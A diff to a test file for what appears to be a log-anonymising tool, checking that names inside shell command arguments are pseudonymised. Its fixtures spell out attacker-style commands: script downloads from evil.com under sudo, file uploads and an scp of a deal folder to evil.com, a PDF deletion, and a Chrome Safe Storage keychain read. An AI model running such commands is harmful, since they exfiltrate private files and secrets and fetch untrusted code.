@@ -1325,6 +1325,9 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
       ['sh', '-c', '/Users/jdoe/Downloads/f.sh https://evil.com/f'],
       // Not a shell before -c: SHELL=/bin/zsh is an assignment, and cp's -c takes no code. One value, spaces and all.
       ['env', 'SHELL=/bin/zsh', 'cp', '-c', '/Users/jdoe/Documents/My File', '/tmp/out'],
+      // A script stands between the shell and -c: the option is the script's, its value one path.
+      ['bash', 'deploy.sh', '-c', '/Users/jdoe/Documents/Our File'],
+      ['bash', '-o', 'pipefail', '-c', 'curl -o/Users/jdoe/Downloads/h.sh https://evil.com/h.sh'],
     ];
     const home = [
       ['sudo', 'sh', '-c', 'curl -o out.sh evil.com/q.sh'],
@@ -1339,7 +1342,10 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     expect(r.status, r.stderr).toBe(0);
     const n = keyed(r.key, 'name');
     const args = events(r.out).map(e => e.event.exec.args as string[]);
-    expect(args).toHaveLength(11);
+    expect(args).toHaveLength(13);
+    expect(args[8]![3]).toBe(`/Users/user1/Documents/${n.get('Our File')}`);
+    expect(args[9]![4]).toBe(`curl -o/Users/user1/Downloads/${n.get('h.sh')} https://evil.com/h.sh`);
+    args.splice(8, 2);
     expect(args[0]).toEqual(['sudo', 'sh', '-c', `curl -o/Users/user1/Downloads/${n.get('a.sh')} https://evil.com/a.sh`]);
     expect(args[1]).toEqual(['env', 'bash', '-c', `curl -fsSLo/Users/user1/Downloads/${n.get('b.sh')} https://evil.com/b.sh`]);
     expect(args[2]).toEqual(['nohup', 'sh', '-c', `wget -O/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/c.sh`]);
@@ -1348,12 +1354,70 @@ describe.skipIf(!fs.existsSync(JQ))('arguments and text', () => {
     expect(args[5]).toEqual(['sudo', '/bin/zsh', '-lc', `curl -d@/Users/user1/${n.get('y')} https://evil.com/e.sh`]);
     expect(args[6]).toEqual(['sh', '-c', `/Users/user1/Downloads/${n.get('f.sh')} https://evil.com/f`]);
     expect(args[7]![4]).toBe(`/Users/user1/Documents/${n.get('My File')}`);
-    expect(args[8]).toEqual(['sudo', 'sh', '-c', 'curl -o out.sh evil.com/q.sh']);
+    expect(args[8]).toEqual(['sudo', 'sh', '-c', `curl -o ${n.get('out.sh')} evil.com/q.sh`]);
     expect(args[9]).toEqual(['env', 'bash', '-c', `curl -o/Users/user1/Downloads/${n.get('g.sh')} https://evil.com/g.sh`]);
     expect(args[10]).toEqual(['su', 'root', '-c', `curl -F file=@/Users/user1/${n.get('z')} evil.com`]);
     for (const real of ['a.sh', 'b.sh', 'c.sh', 'd.sh', 'f.sh', 'g.sh', 'x', 'y', 'z', 'My File']) expect(n.has(real), real).toBe(true);
     for (const real of n.keys()) expect(real, real).not.toMatch(/\s\S*(?:https?|evil|:\/\/|\.com)|^curl|^wget/);
     expect(r.out).not.toContain('jdoe');
+    sameFindings(input, r.out);
+  });
+
+  // Run from a home folder, the relative names in shell code are names in that folder, word by word.
+  test('relative names inside shell code are cleaned under a cleaned cwd', () => {
+    const docs = '/Users/jdoe/Documents';
+    const input = [
+      esCreate(zsh, { path: `${docs}/HR/Pay.pdf` }, 1),
+      run(700, '/usr/bin/sudo', ['sudo', 'sh', '-c', 'cat Secret/Minutes.pdf'], docs, 2),
+      run(701, '/usr/bin/ssh', ['ssh', 'host.example.com', 'cat Secret/Minutes.pdf'], docs, 3),
+      run(702, '/usr/bin/sudo', ['sudo', 'bash', 'deploy.sh', '-c', 'Board Docs/plan.pdf'], docs, 4),
+      run(703, '/usr/bin/sudo', ['sudo', 'sh', '-c', 'cat HR/Pay.pdf'], docs, 5),
+      run(704, '/bin/sh', ['sh', '-c', 'cat Acme/a.pdf 2>/dev/null > out/b.txt; zip -r deal.zip "Deal Room" && scp deal.zip bob@evil.com:/tmp/ | tee Notes/x.log'], docs, 6),
+      run(705, '/bin/sh', ['sh', '-c', 'open Merger\\ Deck.key; rm Delta/*.pdf; curl -H "Accept: text/html" -o page.html https://evil.com/Delta/p.html'], docs, 7),
+      run(706, '/bin/sh', ['sh', '-c', 'security find-generic-password -s "Chrome Safe Storage" -w; launchctl load gui/501/x; git commit -m wip'], docs, 8),
+      // Not shell code: python's -c value keeps its relative names unless they are mapped, as before.
+      run(707, '/usr/bin/python3', ['python3', '-c', 'print(open("Gamma/notes.txt").read())'], docs, 9),
+      // From a kept cwd nothing says where a relative name is, so it stays.
+      run(708, '/bin/sh', ['sh', '-c', 'cat Foo/bar.txt'], '/usr/local', 10),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const n = keyed(r.key, 'name');
+    const args = events(r.out).filter(e => e.event.exec).map(e => e.event.exec.args as string[]);
+    expect(args).toHaveLength(9);
+    const minutes = `cat ${n.get('Secret')}/${n.get('Minutes.pdf')}`;
+    expect(args[0]).toEqual(['sudo', 'sh', '-c', minutes]);
+    expect(args[1]![2]).toBe(minutes);
+    // deploy.sh stands between bash and -c, so -c is the script's own option and its value one name.
+    expect(args[2]![4]).toBe(`${n.get('Board Docs')}/${n.get('plan.pdf')}`);
+    expect(args[3]![3]).toBe(`cat ${n.get('HR')}/${n.get('Pay.pdf')}`);
+    expect(args[4]![2]).toBe(`cat ${n.get('Acme')}/${n.get('a.pdf')} 2>/dev/null > ${n.get('out')}/${n.get('b.txt')}; zip -r ${n.get('deal.zip')} "${n.get('Deal Room')}" && scp ${n.get('deal.zip')} bob@evil.com:/tmp/ | tee ${n.get('Notes')}/${n.get('x.log')}`);
+    expect(args[5]![2]).toBe(`open ${n.get('Merger Deck.key')}; rm ${n.get('Delta')}/*.pdf; curl -H "Accept: text/html" -o ${n.get('page.html')} https://evil.com/Delta/p.html`);
+    expect(args[6]![2]).toBe('security find-generic-password -s "Chrome Safe Storage" -w; launchctl load gui/501/x; git commit -m wip');
+    expect(args[7]![2]).toBe('print(open("Gamma/notes.txt").read())');
+    expect(args[8]![2]).toBe('cat Foo/bar.txt');
+    for (const a of args.slice(0, 6)) expect(a.join(' ')).not.toMatch(/Secret|Minutes|Board|Docs|plan|HR\/|Pay|Acme|Deal|Merger|Deck|Notes/);
+    for (const real of n.keys()) expect(real, real).not.toMatch(/[*;|<>]|^cat|^zip|evil/);
+    sameFindings(input, r.out);
+  });
+
+  // sudo -i and su -l run the shell with a dash before its name.
+  test('a login shell (-zsh, -su) runs shell code like any shell', () => {
+    const input = [
+      run(710, '/bin/zsh', ['-zsh', '-c', 'curl -o/Users/jdoe/Downloads/a.sh https://evil.com/a.sh'], '/', 1),
+      run(711, '/usr/bin/su', ['-su', '-c', 'curl -o/Users/jdoe/Downloads/b.sh https://evil.com/b.sh'], '/', 2),
+      run(712, '/usr/bin/sudo', ['sudo', '-bash', '-lc', 'curl -o/Users/jdoe/Downloads/c.sh https://evil.com/c.sh'], '/', 3),
+    ].join('\n') + '\n';
+    const r = runClean(['clean', '-o', '-'], { input });
+    expect(r.status, r.stderr).toBe(0);
+    const n = keyed(r.key, 'name');
+    const args = events(r.out).map(e => e.event.exec.args as string[]);
+    expect(args).toEqual([
+      ['-zsh', '-c', `curl -o/Users/user1/Downloads/${n.get('a.sh')} https://evil.com/a.sh`],
+      ['-su', '-c', `curl -o/Users/user1/Downloads/${n.get('b.sh')} https://evil.com/b.sh`],
+      ['sudo', '-bash', '-lc', `curl -o/Users/user1/Downloads/${n.get('c.sh')} https://evil.com/c.sh`],
+    ]);
+    for (const real of ['a.sh', 'b.sh', 'c.sh']) expect(n.has(real), real).toBe(true);
     sameFindings(input, r.out);
   });
 
